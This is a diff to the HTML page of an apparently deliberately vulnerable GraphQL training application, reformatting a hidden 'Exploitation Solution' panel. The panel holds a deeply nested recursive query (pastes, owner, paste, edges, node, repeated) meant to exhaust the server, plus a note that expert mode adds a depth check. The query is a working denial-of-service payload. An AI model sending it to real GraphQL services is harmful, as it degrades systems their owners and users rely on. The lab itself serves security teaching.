@@ -22,26 +22,24 @@
 <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-dos-recursion')">Show</button></h5>
 <div style="display:none" id="sol-dos-recursion">
   <pre class="bash">
-    # Beginner mode:
+# Beginner mode:
 
-    query {
-      pastes {
-        owner {
-          paste {
-            edges {
-              node {
-                  owner {
-                    paste {
-                      edges {
-                        node {
-                          owner {
-                            paste {
-                              edges {
-                                node {
-                                  owner {
-                                    id
-                                  }
-                                }
+query {
+  pastes {
+    owner {
+      paste {
+        edges {
+          node {
+              owner {
+                paste {
+                  edges {
+                    node {
+                      owner {
+                        paste {
+                          edges {
+                            node {
+                              owner {
+                                id
                               }
                             }
                           }
@@ -55,10 +53,11 @@
           }
         }
       }
+    }
+  }
 
-    # Expert mode
+# Expert mode
 
-    # A depth check is implemented which should prevent malicious queries from going through.
-  </pre>
+# A depth check is implemented which should prevent malicious queries from going through.</pre>
 </div>
 <!-- End -->
